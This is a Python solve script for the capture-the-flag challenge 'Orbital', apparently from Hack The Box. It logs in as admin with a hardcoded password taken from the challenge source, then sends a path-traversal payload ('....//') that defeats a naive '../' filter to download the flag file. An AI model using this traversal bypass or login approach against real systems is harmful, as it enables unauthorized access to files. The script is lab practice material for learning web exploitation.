import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_admin(s, url):
	print("\n[+] Trying to log in as admin with credentials found in the source code (entrypoint.sh)...")
	print("""function genPass() {
    echo -n 'ichliebedich' | md5sum | head -c 32
}
        [...]
INSERT INTO orbital.users (username, password) VALUES ('admin', '$(genPass)');
""")
	login_path = url + '/api/login'
	data = {
		"username":"admin",
		"password":"ichliebedich"
	}
	time.sleep(1)
	print('\n[+] Sending:')
	print(data)
	r = s.post(login_path, json=data)
	time.sleep(1)
	print(r.text)
	time.sleep(1)
	jwt_token = s.cookies['session']
	print(jwt_token)
	return jwt_token

def get_flag(s, url, token):
	print("\n[+] Trying to retrieve the flag...")
	export_path = url + '/api/export'
	s.cookies.clear()
	print('[+] Located a readable copy of flag.txt in the source code (Dockerfile)...')
	print("""# copy flag
COPY flag.txt /signal_sleuth_firmware
COPY files /communications/
""")
	cookies = {'session': token}
	print('\n[+] Bypassing the filter in the exportFile function (routes.py)...')
	print("""        # Everyone is saying I should escape specific characters in the filename. I don't know why?
        communicationName = communicationName.replace('../', '')
        return send_file(f'/communications/{communicationName}', as_attachment=True)
""")
	data = {
		"name": "....//signal_sleuth_firmware"
	}
	time.sleep(1)
	print('\n[+] Sending:')
	print(data)
	r = s.post(export_path, json=data, cookies=cookies)
	time.sleep(1)
	print('\n')
	print(r.text)

def show_usage():
	print('[+] Usage: %s <TARGET>' % sys.argv[0])
	print('[+] Example: %s 127.0.0.1:1337' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] HTB Challenge: Orbital')
	try:
		url = 'http://' + sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find Vulnerabilities...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			token = get_admin(s, url)
			get_flag(s, url, token)
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(1)

if __name__ == "__main__":
	main()
